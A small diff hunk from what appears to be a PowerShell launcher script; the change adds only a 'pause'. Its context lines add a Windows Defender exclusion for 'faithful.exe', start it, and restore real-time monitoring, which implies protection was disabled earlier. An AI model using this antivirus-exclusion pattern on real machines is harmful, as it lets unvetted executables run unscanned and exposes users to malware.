@@ -28,3 +28,4 @@ Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Start-Process ("faithful.exe")
 Set-MpPreference -DisableRealtimeMonitoring $false
 Write-Output "Done!"
+pause
